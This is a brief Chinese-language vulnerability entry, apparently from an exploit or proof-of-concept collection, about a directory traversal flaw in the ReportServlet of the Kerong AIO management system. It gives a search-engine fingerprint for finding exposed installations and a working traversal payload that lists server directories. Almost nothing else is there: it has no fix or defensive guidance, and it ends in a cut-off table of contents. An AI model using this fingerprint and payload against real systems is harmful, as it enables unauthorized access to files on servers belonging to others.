# 科荣AIO管理系统ReportServlet存在目录遍历漏洞

科荣AIO管理系统 ｜ 路径遍历 ｜ —
- **指纹**：`app.name="科荣 AIO"`

**Payload**
```
/ReportServlet?operation=getFileList&path=../../../
```
- **其他**：科荣 AIO 管理系统 ReportServlet 存在目录遍历漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* [四、漏洞复现](#%E5%9B%9B%E6%BC%8F%E6%B4%9E%E5%A4%8